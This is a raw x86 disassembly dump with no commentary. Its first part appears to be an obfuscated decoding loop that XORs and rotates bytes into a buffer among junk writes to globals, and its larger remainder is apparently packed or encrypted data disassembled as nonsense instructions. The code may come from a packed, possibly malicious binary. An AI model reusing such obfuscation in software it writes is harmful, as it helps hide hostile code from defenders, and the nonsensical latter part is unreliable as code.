  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x42fa18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xeec4e32d,al
  403bc1:	nop
  403bc2:	jo     0x403bd1
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	test   DWORD PTR [ebp+edi*4+0x2044ffa5],edx
  403bd3:	test   al,0xda
  403bd5:	aam    0x96
  403bd7:	jnp    0x403bde
  403bd9:	adc    ebx,ecx
  403bdb:	mov    WORD PTR [edi-0x645327b3],?
  403be1:	or     bh,BYTE PTR [ebx-0x7e]
  403be4:	js     0x403b9c
  403be6:	cmp    al,0x4e
  403be8:	pushf  
  403be9:	shr    BYTE PTR [ecx-0x6d217ad9],0x32
  403bf0:	sbb    BYTE PTR [esi-0x5d2e2ed6],cl
  403bf6:	stos   BYTE PTR es:[edi],al
  403bf7:	addr16 mov ah,0x25
  403bfa:	push   ss
  403bfb:	dec    edi
  403bfc:	in     eax,0xdf
  403bfe:	cmp    al,0x6
  403c00:	mov    esp,0xdf86dbb6
  403c05:	mov    ebx,0x4a185ec0
  403c0a:	add    eax,0x28a763c8
  403c0f:	adc    eax,0xa36791d5
  403c14:	xor    eax,0x15712df8
  403c19:	sub    eax,DWORD PTR [edx+0x53]
  403c1c:	outs   dx,BYTE PTR ds:[esi]
  403c1d:	in     eax,dx
  403c1e:	sti    
  403c1f:	adc    BYTE PTR [esi+0x16d0f849],ch
  403c25:	ror    DWORD PTR [edi+0x5e],1
  403c28:	jns    0x403be9
  403c2a:	fisub  WORD PTR [eax+0x5d01c165]
  403c30:	in     al,dx
  403c31:	sbb    al,0xc7
  403c33:	imul   eax,DWORD PTR es:[ebx-0x65cdcae2],0x101b8988
  403c3e:	mov    ch,0xd6
  403c40:	jge    0x403bd4
  403c42:	pop    edi
  403c43:	sub    DWORD PTR [ecx+0x63],esp
  403c46:	xor    BYTE PTR [edi+0x4d],ah
  403c49:	jo     0x403c73
  403c4b:	rcl    DWORD PTR [edx-0x21],cl
  403c4e:	xor    BYTE PTR [edi+0x48bf8ff6],bh
  403c54:	scas   al,BYTE PTR es:[edi]
  403c55:	mov    ecx,0xcc68ba03
  403c5a:	or     al,0xd4
  403c5c:	xchg   ecx,eax
  403c5d:	sub    BYTE PTR [ecx-0x41ebe566],bl
  403c63:	(bad)  
  403c64:	fs pop ss
  403c66:	jb     0x403ca7
  403c68:	gs jecxz 0x403cca
  403c6b:	dec    edi
  403c6c:	xchg   BYTE PTR [edi*8+0x1dcdfc5f],dl
  403c73:	push   cs
  403c74:	adc    eax,0x6bb8934f
  403c79:	mov    al,ds:0x620f4e33
  403c7e:	outs   dx,DWORD PTR ds:[esi]
  403c7f:	xor    ebp,DWORD PTR [edx-0x45]
  403c82:	fcmovnbe st,st(0)
  403c84:	adc    ecx,DWORD PTR [edi]
  403c86:	mov    al,ds:0x830759d9
  403c8b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8d:	ret    
  403c8e:	push   ebx
  403c8f:	inc    esp
  403c90:	or     cl,bl
  403c92:	imul   ecx,DWORD PTR [edx],0x2667278b
  403c98:	jp     0x403cac
  403c9a:	pop    ax
  403c9c:	aad    0x43
  403c9e:	xchg   DWORD PTR [edx+0x4d8923c2],edx
  403ca4:	(bad)  
  403ca5:	sti    
  403ca6:	xchg   ebx,eax
  403ca7:	push   esi
  403ca8:	push   ebp
  403ca9:	cmp    al,0x63
  403cab:	rol    BYTE PTR [ecx*1-0x122c64a0],0xec
  403cb3:	xchg   ebp,eax
  403cb4:	lock mov ebp,0x6029e014
  403cba:	dec    BYTE PTR [ecx]
  403cbc:	xor    edi,DWORD PTR [edx]
  403cbe:	std    
  403cbf:	outs   dx,BYTE PTR ds:[esi]
  403cc0:	retf   0x3ac9
  403cc3:	adc    BYTE PTR [esi+0x5d20295b],ch
  403cc9:	call   0x9ea86e91
  403cce:	jns    0x403c6f
  403cd0:	loope  0x403c56
  403cd2:	jnp    0x403cac
  403cd4:	ja     0x403c9c
  403cd6:	inc    ebp
  403cd7:	or     bh,bl
  403cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cda:	pop    ds
  403cdb:	add    esi,DWORD PTR [edx+0x3b]
  403cde:	sbb    al,0x2c
  403ce0:	mov    eax,ds:0xfbacb116
  403ce5:	(bad)  
  403ce6:	imul   esp,eax,0x75
  403ce9:	dec    esp
  403cea:	adc    bh,BYTE PTR [eax+0x40]
  403ced:	jmp    0x77a9:0xeff908c2
  403cf4:	in     eax,0x20
  403cf6:	shl    ebx,1
  403cf8:	cmc    
  403cf9:	into   
  403cfa:	sahf   
  403cfb:	xor    eax,0x194eaa6b
  403d00:	pop    ebx
  403d01:	je     0x403d17
  403d03:	dec    ebp
  403d04:	imul   edx,DWORD PTR [esi-0x6e],0xffffffb1
  403d08:	dec    ebx
  403d09:	mov    ds:0x9dfa6de7,al
  403d0e:	sbb    esi,DWORD PTR [ecx-0x1da3edda]
  403d14:	and    al,0x5c
  403d16:	adc    esp,eax
  403d18:	sub    ah,BYTE PTR [edx+0x479e5e63]
  403d1e:	cmp    DWORD PTR [ecx],0x7e
  403d21:	icebp  
  403d22:	and    DWORD PTR [ebp-0x4386a40f],ecx
  403d28:	sub    al,0x48
  403d2a:	add    esp,DWORD PTR [ebx-0x74476138]
  403d30:	add    BYTE PTR [ecx],0xcf
  403d33:	retf   
  403d34:	mov    edi,0xbe919d63
  403d39:	imul   esi,DWORD PTR [ecx],0xffffffef
  403d3c:	mov    ah,0xa4
  403d3e:	int3   
  403d3f:	shl    ch,cl
  403d41:	popf   
  403d42:	sar    DWORD PTR [ebp+0x23],0x6e
  403d46:	sbb    eax,0x2a4f9268
  403d4b:	ret    0xaedb
  403d4e:	pop    ds
  403d4f:	sahf   
  403d50:	(bad)
  403d54:	or     ch,BYTE PTR [ebp+0x141f965c]
  403d5a:	mov    edx,0xfeb9dc07
  403d5f:	xor    cl,BYTE PTR [edi]
  403d61:	cmp    al,ah
  403d63:	inc    DWORD PTR [ebx-0x49]
  403d66:	mov    eax,ds:0xe67e92d7
  403d6b:	cwde   
  403d6c:	mov    bh,0xdc
  403d6e:	iret   
  403d6f:	dec    esp
  403d70:	pop    ecx
  403d71:	sub    ch,0x54
  403d74:	xor    ah,dh
  403d76:	adc    eax,0x3b0ba415
  403d7b:	hlt    
  403d7c:	dec    esi
  403d7d:	mov    eax,ds:0x12abceb9
  403d82:	stos   BYTE PTR es:[edi],al
  403d83:	out    dx,eax
  403d84:	jle    0x403d89
  403d86:	mov    dh,0x37
  403d88:	xor    eax,0x8af5b5de
  403d8d:	cmp    ebp,ebx
  403d8f:	cmp    DWORD PTR [eax-0x11bc6382],ebp
  403d95:	mov    al,0xad
  403d97:	dec    esp
  403d98:	add    al,0x6e
  403d9a:	cmp    eax,0x386497e4
  403d9f:	xchg   esi,eax
  403da0:	aas    
  403da1:	sub    eax,0x49190a3a
  403da6:	dec    ebp
  403da7:	data16 mov gs,WORD PTR fs:[esi-0x9492f66]
  403daf:	cdq    
  403db0:	jne    0x403d87
  403db2:	(bad)  
  403db3:	jno    0x403da7
  403db5:	adc    ebx,DWORD PTR [edx+0x1bc14911]
  403dbb:	pop    eax
  403dbc:	and    ecx,ebx
  403dbe:	or     eax,0xe64204d8
  403dc3:	adc    BYTE PTR [esi+0x1ae3e07f],0xe8
  403dca:	pop    ebx
  403dcb:	mov    ch,0x85
  403dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dce:	push   0x39
  403dd0:	sub    al,0x77
  403dd2:	jno    0x403db2
  403dd4:	arpl   WORD PTR [ecx-0x4313e53c],bx
  403dda:	cwde   
  403ddb:	clc    
  403ddc:	xchg   edi,eax
  403ddd:	sub    al,0x1d
  403ddf:	(bad)  
  403de0:	xor    dl,ch
  403de2:	fnstenv [edx]
  403de4:	adc    DWORD PTR [ebp+0x1f01f44a],esi
  403dea:	sbb    DWORD PTR [ebp+0xcb616f0],ecx
  403df0:	xor    dh,BYTE PTR [ebx]
  403df2:	sub    BYTE PTR [edi-0x6a034c5e],cl
  403df8:	or     dl,BYTE PTR [esi-0x36]
  403dfb:	sbb    al,ah
  403dfd:	push   0xffffffdb
  403dff:	aaa    
  403e00:	inc    edx
  403e01:	dec    ecx
  403e02:	neg    DWORD PTR [ebp+0x55]
  403e05:	mov    fs,ebx
  403e07:	(bad)  
  403e08:	int    0x64
  403e0a:	push   esp
  403e0b:	jbe    0x403e2f
  403e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e0e:	(bad)  
  403e0f:	(bad)  
  403e10:	in     al,dx
  403e11:	rcl    DWORD PTR [ecx+0x18bb68be],1
  403e17:	je     0x403dfc
  403e19:	leave  
  403e1a:	fwait
  403e1b:	fwait
  403e1c:	adc    eax,0xc0d168b9
  403e21:	fs es cld 
  403e24:	(bad)  
  403e26:	xlat   BYTE PTR ds:[ebx]
  403e27:	pop    ebp
  403e28:	fdivrp st(3),st
  403e2a:	jmp    FWORD PTR [eax]
  403e2c:	enter  0xca09,0x97
  403e30:	push   esp
  403e31:	mov    ds,WORD PTR [edx+0x6dca03fc]
  403e37:	mov    ah,0xa8
  403e39:	pop    ebp
  403e3a:	jo     0x403dc3
  403e3c:	outs   dx,DWORD PTR ds:[esi]
  403e3d:	mov    ds,WORD PTR [ebp+0x55]
  403e40:	xchg   esp,eax
  403e41:	popa   
  403e42:	(bad)  
  403e43:	sub    al,0x22
  403e45:	adc    ah,BYTE PTR [eax+0xc]
  403e48:	adc    ch,al
  403e4a:	dec    eax
  403e4b:	inc    esp
  403e4c:	cmp    DWORD PTR [ecx],esi
  403e4e:	pop    ebx
  403e4f:	inc    ebx
  403e50:	pop    ss
  403e51:	or     eax,ecx
  403e53:	and    esp,esi
  403e55:	in     al,0xa
  403e57:	in     al,0x0
  403e59:	retf   
  403e5a:	sbb    eax,0x2e7581
  403e5f:	jg     0x403eb5
  403e61:	lods   eax,DWORD PTR ds:[esi]
  403e62:	sbb    BYTE PTR [eax+0x9],bh
  403e65:	add    eax,0xe066d3eb
  403e6a:	sub    BYTE PTR ss:[eax+edx*8-0x79],al
  403e6f:	pushf  
  403e70:	jecxz  0x403e15
  403e72:	xor    eax,0x589529cd
  403e77:	mov    DWORD PTR [edx+ebp*2+0x54e04335],ebx
  403e7e:	dec    ebx
  403e7f:	or     DWORD PTR ds:0x78a1c8da,esi
  403e85:	and    eax,DWORD PTR [ebx+0x35]
  403e88:	jp     0x403e22
  403e8a:	pop    ecx
  403e8b:	pop    ecx
  403e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e8d:	cmp    BYTE PTR [eax],0x4d
  403e90:	mov    al,0x29
  403e92:	push   eax
  403e93:	pop    ebp
  403e94:	mov    ah,0x77
  403e96:	leave  
  403e97:	mov    edx,0xce1dfef
  403e9c:	mov    cl,0x10
  403e9e:	das    
  403e9f:	or     edi,esi
  403ea1:	mov    edi,0x37a379aa
  403ea6:	aad    0x84
  403ea8:	mov    esi,DWORD PTR [eax-0x38]
  403eab:	add    DWORD PTR [eax+0x6a],edi
  403eae:	pop    esi
  403eaf:	cs or  al,0x2e
  403eb2:	mov    eax,0x41c09a9a
  403eb7:	pop    eax
  403eb8:	xchg   DWORD PTR [eax+0x61],ecx
  403ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebc:	jmp    0xb145f169
  403ec1:	sbb    DWORD PTR [ebx+eax*8-0x45add1ff],edi
  403ec8:	sbb    al,0x86
  403eca:	aam    0xf7
  403ecc:	mov    cl,0x19
  403ece:	pop    es
  403ecf:	(bad)  [edx-0x7d]
  403ed2:	in     eax,0x28
  403ed4:	pop    ss
  403ed5:	dec    ecx
  403ed6:	ja     0x403f1f
  403ed8:	sti    
  403ed9:	mov    ebx,0xe8af7e36
  403ede:	sbb    ah,BYTE PTR [edi+0x59]
  403ee1:	mov    ebp,0x54fe7731
  403ee6:	and    DWORD PTR [ebp+0x27cde8e2],0xffffffb1
  403eed:	jns    0x403f26
  403eef:	out    dx,eax
  403ef0:	std    
  403ef1:	and    BYTE PTR [eax+0x7cb3a7b4],bh
  403ef7:	dec    eax
  403ef8:	out    0x6b,al
  403efa:	inc    eax
  403efb:	pop    ebp
  403efc:	add    edx,ebp
  403efe:	dec    ebx
  403eff:	sti    
  403f00:	inc    esi
  403f01:	retf   
  403f02:	sti    
  403f03:	jae    0x403f11
  403f05:	jmp    0x231a:0xd6a3dc2
  403f0c:	js     0x403efd
  403f0e:	sti    
  403f0f:	aad    0x5c
  403f11:	in     al,0x38
  403f13:	imul   eax,DWORD PTR [esi+0x23],0xe3698c63
  403f1a:	aam    0x15
  403f1c:	add    edx,DWORD PTR [edx]
  403f1e:	fs das 
  403f20:	mov    ss,WORD PTR [ebx+0x496bf51]
  403f26:	adc    ebp,ebx
  403f28:	div    DWORD PTR [edx-0x5b4e31c0]
  403f2e:	xchg   ebp,eax
  403f2f:	cmp    DWORD PTR [ecx-0x4],ebp
  403f32:	inc    edi
  403f33:	stos   DWORD PTR es:[edi],eax
  403f34:	fidivr DWORD PTR [ebp+0x5ad7be7e]
  403f3a:	mov    ss,WORD PTR [eax-0x66]
  403f3d:	push   cs
  403f3e:	mov    al,0xa6
  403f40:	xchg   ecx,eax
  403f41:	shl    DWORD PTR [ebx+ebx*2],cl
  403f44:	mov    al,0x70
  403f46:	adc    al,0x44
  403f48:	pop    ecx
  403f49:	pop    ecx
  403f4a:	fbstp  TBYTE PTR [edx]
  403f4c:	(bad)  
  403f4d:	neg    DWORD PTR [ebp+0x6a84d80b]
  403f53:	int3   
  403f54:	adc    al,0xa2
  403f56:	inc    edi
  403f57:	mov    al,0x1e
  403f59:	mov    edx,0x155f8e5e
  403f5e:	fwait
  403f5f:	jecxz  0x403efe
  403f61:	sbb    al,BYTE PTR [edi+eiz*4]
  403f64:	push   edx
  403f65:	mov    ebp,0xd27f36bd
  403f6a:	sahf   
  403f6b:	mov    ds:0x45e4d3aa,al
  403f70:	sbb    esi,DWORD PTR [ebx]
  403f72:	pusha  
  403f73:	stos   BYTE PTR es:[edi],al
  403f74:	and    BYTE PTR [edx-0x65],bl
  403f77:	inc    esi
  403f78:	shr    BYTE PTR [ebx],0x75
  403f7b:	mov    edx,0x3c94026e
  403f80:	sbb    ebp,DWORD PTR [edx+eiz*2+0xe]
  403f84:	xor    DWORD PTR [edi],ebp
  403f86:	push   esi
  403f87:	xchg   BYTE PTR [ebx+0x35],cl
  403f8a:	fst    DWORD PTR [edx+0x3c47bdb3]
  403f90:	test   al,0x74
  403f92:	add    al,0xff
  403f94:	sub    BYTE PTR gs:[esi-0x14738bc7],bl
  403f9b:	in     al,dx
  403f9c:	in     al,0xcc
  403f9e:	mov    esi,0x45a457e8
  403fa4:	in     eax,dx
  403fa5:	lods   al,BYTE PTR ds:[esi]
  403fa6:	shl    BYTE PTR [edx],1
  403fa8:	jle    0x403f4a
  403faa:	pop    ss
  403fab:	jne    0x403fb3
  403fad:	xor    DWORD PTR [ebp+0x2545db5f],esp
  403fb3:	jns    0x403fbf
  403fb5:	push   ecx
  403fb6:	sbb    esp,DWORD PTR [ecx-0x69]
  403fb9:	call   0x529:0xb65de125
  403fc0:	cmp    BYTE PTR [edi],ch
  403fc2:	cmc    
  403fc3:	sbb    al,bl
  403fc5:	mov    eax,ds:0xee54f6f4
  403fca:	gs xor ah,cl
  403fcd:	in     eax,0xb5
  403fcf:	mov    ds:0xf8a6fe4,al
  403fd4:	into   
  403fd5:	lods   eax,DWORD PTR ds:[esi]
  403fd6:	push   0xffffffca
  403fd8:	add    bl,BYTE PTR [ebp-0x3089571c]
  403fde:	pop    ecx
  403fdf:	push   esp
  403fe0:	or     bl,BYTE PTR ds:0xe9b6e97a
  403fe6:	jecxz  0x403f97
  403fe8:	ret    0xec09
  403feb:	dec    esp
  403fec:	jmp    0x2d43c949
  403ff1:	aad    0xe5
  403ff3:	sbb    bl,BYTE PTR [eax+0x399149e9]
  403ff9:	cmc    
  403ffa:	daa    
  403ffb:	clc    
  403ffc:	pop    edx
  403ffd:	inc    ebx
  403ffe:	pushf  
  403fff:	sub    eax,0xf16885fa
  404004:	sti    
  404005:	jns    0x404084
  404007:	add    al,0xed
  404009:	push   esi
  40400a:	mov    bh,BYTE PTR [ebx]
  40400c:	out    dx,al
  40400d:	cs clc 
  40400f:	cdq    
  404010:	or     DWORD PTR [eax+eiz*4-0x7a37da5f],0x8
  404018:	and    eax,0xd4614db
  40401d:	ins    DWORD PTR es:[edi],dx
  40401e:	pop    esi
  40401f:	sub    BYTE PTR [edi],ch
  404021:	data16 lahf 
  404023:	or     edi,DWORD PTR ds:0x72d83425
  404029:	mov    ebx,0x1573cef5
  40402e:	dec    ebp
  40402f:	mov    ds:0x38f3e98,eax
  404034:	sbb    BYTE PTR [ecx-0xc],bh
  404037:	adc    BYTE PTR [ecx],0x3e
  40403a:	dec    ebx
  40403b:	mov    es,WORD PTR [ecx+0x2f]
  40403e:	fadd   DWORD PTR [edx+0x36]
  404041:	sub    esi,eax
  404043:	loope  0x4040bd
  404045:	pandn  mm0,QWORD PTR [eax-0x41]
  404049:	sbb    al,0x42
  40404b:	jae    0x404094
  40404d:	addr16 jl 0x4040a4
  404050:	cmp    ch,BYTE PTR [ebp+0x320210ef]
  404056:	cmp    BYTE PTR [edi-0xc121d07],dl
  40405c:	mov    ebp,0x4944bf17
  404061:	in     al,0xdc
  404063:	clc    
  404064:	test   ecx,ecx
  404066:	out    dx,eax
  404067:	fwait
  404068:	xchg   ecx,eax
  404069:	xor    edx,DWORD PTR [ecx-0x4e93b109]
  40406f:	dec    edi
  404070:	aad    0x76
  404072:	in     al,0x22
  404074:	push   ecx
  404075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404076:	call   FWORD PTR [esi+0x2b]
  404079:	(bad)  
  40407a:	fcom   DWORD PTR [esp+esi*4]
  40407d:	jmp    0x7d07:0x6d7280b4
  404084:	aas    
  404085:	rcl    BYTE PTR ds:[edx-0x652f312c],cl
  40408c:	bound  esp,QWORD PTR [ebp-0x2e1d4db8]
  404092:	ds retf 0xc0ab
  404096:	push   es
  404097:	cdq    
  404098:	in     eax,0x1c
  40409a:	cmp    DWORD PTR ds:0x5a9bada,0x18
  4040a1:	pop    esi
  4040a2:	jle    0x40404d
  4040a4:	sbb    edx,DWORD PTR [edx-0x5e]
  4040a7:	mov    ds:0xd54f400d,al
  4040ac:	inc    ebx
  4040ad:	pop    es
  4040ae:	push   0x62f97ee7
  4040b3:	jecxz  0x4040d8
  4040b5:	mov    cl,0xba
  4040b7:	jae    0x4040df
  4040b9:	je     0x4040c7
  4040bb:	dec    eax
  4040bc:	in     eax,dx
  4040bd:	sbb    eax,DWORD PTR [edi-0x4e]
  4040c0:	ins    DWORD PTR es:[edi],dx
  4040c1:	jle    0x4040b6
  4040c3:	inc    esp
  4040c4:	(bad)  [edx-0x31]
  4040c7:	test   bh,al
  4040c9:	into   
  4040ca:	xor    DWORD PTR fs:[ecx],0xffffffaf
  4040ce:	aad    0xe5
  4040d0:	push   es
  4040d1:	fidivr WORD PTR [ebp-0x791f5414]
  4040d7:	mov    esi,0xd91f7507
  4040dc:	in     eax,dx
  4040dd:	push   es
  4040de:	(bad)  
  4040df:	lea    eax,[ecx+esi*4+0x16]
  4040e3:	popf   
  4040e4:	repnz loope 0x404153
  4040e7:	jp     0x4040ef
  4040e9:	jo     0x4040f4
  4040eb:	dec    ecx
  4040ec:	xchg   edx,eax
  4040ed:	sub    ecx,ecx
  4040ef:	inc    esi
  4040f0:	add    edi,DWORD PTR [ecx+0x23]
  4040f3:	cmp    ecx,DWORD PTR [eax]
  4040f5:	inc    edx
  4040f6:	sub    cl,0x53
  4040f9:	inc    edi
  4040fa:	fmul   DWORD PTR [edx+0x1a920f59]
  404100:	(bad)  
  404101:	sbb    edi,DWORD PTR [edx]
  404103:	iret   
  404104:	enter  0xb8b8,0xe4
  404108:	push   eax
  404109:	add    dl,bl
  40410b:	mov    bl,0x9f
  40410d:	in     al,dx
  40410e:	add    BYTE PTR [edx+0x75e236d7],bl
  404114:	and    BYTE PTR [ebx-0x73],0xc6
  404118:	mov    ah,0xd8
  40411a:	mov    eax,0xf601b4cf
  40411f:	dec    eax
  404120:	sbb    al,0x3f
  404122:	xor    al,0x3d
  404124:	jge    0x4040ee
  404126:	std    
  404127:	adc    ah,cl
  404129:	sub    edi,0x26
  40412c:	pop    ebx
  40412d:	loop   0x4040e3
  40412f:	mov    eax,ds:0x82c096cd
  404134:	sbb    edi,edx
  404136:	mov    ebx,0xe1b40d06
  40413b:	or     DWORD PTR [edx-0x32],ebp
  40413e:	rol    BYTE PTR [edi+0x4af29552],0xd3
  404145:	push   ds
  404146:	or     eax,ebp
  404148:	dec    ebx
  404149:	mov    edi,DWORD PTR [edi]
  40414b:	aas    
  40414c:	inc    ebp
  40414d:	jmp    0x4040f9
  40414f:	cwde   
  404150:	ins    DWORD PTR es:[edi],dx
  404151:	rcr    DWORD PTR [esi],0x4a
  404154:	sbb    eax,DWORD PTR [edi-0xf]
  404157:	int    0x72
  404159:	pop    es
  40415a:	retf   0xd82a
  40415d:	test   DWORD PTR [eax+eiz*2],esp
  404160:	stc    
  404161:	sbb    ecx,esp
  404163:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404165:	jae    0x4041ca
  404167:	push   esi
  404168:	mov    ds:0x62303a09,al
  40416d:	repz and eax,DWORD PTR [ecx+0x79f7eb5f]
  404174:	aad    0x23
  404176:	mov    cl,0xb9
  404178:	ret    0x3de6
  40417b:	in     eax,dx
  40417c:	or     ebp,DWORD PTR [edx-0x71ba618f]
  404182:	or     DWORD PTR [eax-0x45619acc],0x2a
  404189:	adc    ecx,DWORD PTR [edi+0x28]
  40418c:	das    
  40418d:	cdq    
  40418e:	or     edx,edi
  404190:	sbb    BYTE PTR [edx+0x69a4b4f5],bl
  404196:	ins    BYTE PTR es:[edi],dx
  404197:	pop    ebx
  404198:	adc    ch,BYTE PTR [ebx]
  40419a:	js     0x404139
  40419c:	in     eax,0x1
  40419e:	test   eax,0x615b7db3
  4041a3:	adc    ah,al
  4041a5:	jg     0x40414f
  4041a7:	mov    ebx,0xf8eb7f3a
  4041ac:	add    bl,dl
  4041ae:	clc    
  4041af:	add    BYTE PTR [edx+0x6c8b6d05],dh
  4041b5:	retf   
  4041b6:	fisttp WORD PTR [ecx+0x250bfc16]
  4041bc:	scas   eax,DWORD PTR es:[edi]
  4041bd:	nop
  4041be:	arpl   WORD PTR [ebx+0x704f565b],bp
  4041c4:	(bad)  
  4041c5:	iret   
  4041c6:	clc    
  4041c7:	and    DWORD PTR [ebx],esp
  4041c9:	scas   al,BYTE PTR es:[edi]
  4041ca:	shl    BYTE PTR [eax-0x4b],1
  4041cd:	fcom   DWORD PTR [ebp-0x3c453d2f]
  4041d3:	mov    eax,ds:0x8f130c
  4041d8:	sbb    eax,edi
  4041da:	(bad)  [eax+0x65f20d79]
  4041e0:	xchg   edi,eax
  4041e1:	(bad)
  4041e4:	xchg   edi,eax
  4041e5:	mov    dh,0x16
  4041e7:	cld    
  4041e8:	mov    al,ds:0x1e9477ec
  4041ed:	push   ecx
  4041ee:	xchg   ecx,eax
  4041ef:	mov    fs,WORD PTR [ebx+0x2b]
  4041f2:	mov    bh,0x33
  4041f4:	mov    ds:0xfef906a9,al
  4041f9:	jae    0x4041fe
  4041fb:	mov    ah,0x87
  4041fd:	out    0x8,al
  4041ff:	fcomp  DWORD PTR [edx+0x3dc02f49]
  404205:	jp     0x40419f
  404207:	jno    0x404237
  404209:	and    dl,BYTE PTR [ebx+0x54aa4a6a]
  40420f:	and    al,0xfa
  404211:	enter  0x9619,0x45
  404215:	mov    ah,0xf1
  404217:	bound  ebp,QWORD PTR [eax+0x5ea8d63c]
  40421d:	mov    eax,ds:0xc707ce5a
  404222:	jnp    0x4041da
  404224:	push   cs
  404225:	push   ebp
  404226:	sbb    al,0xf4
  404228:	jg     0x4041c0
  40422a:	test   al,0x37
  40422c:	jo     0x404289
  40422e:	mov    esp,DWORD PTR [esi+esi*1-0x7d91dabd]
  404235:	push   0xffffffaa
  404237:	mov    edi,0x158c2244
  40423c:	in     eax,0xb1
  40423e:	sbb    BYTE PTR [ecx-0x5d8d4472],dl
  404244:	(bad)  
  404245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404246:	je     0x40424c
  404248:	sub    ecx,DWORD PTR [edx+0x433e88a1]
  40424e:	mov    ch,0xa1
  404250:	pusha  
  404251:	sar    DWORD PTR [ecx],1
  404253:	daa    
  404254:	mov    edx,0x3774bc96
  404259:	and    esp,DWORD PTR [edi]
  40425b:	test   eax,0x434cbdc3
  404260:	fisub  DWORD PTR [ebx+0x77ceb81a]
  404266:	aad    0x41
  404268:	jmp    0x646a:0x29f9dd93
  40426f:	mov    ds:0xc64b8f3b,al
  404274:	dec    eax
  404275:	test   BYTE PTR [edi],al
  404277:	jle    0x4042d4
  404279:	aad    0xcb
  40427b:	mov    bl,0x8d
  40427d:	xchg   ebp,eax
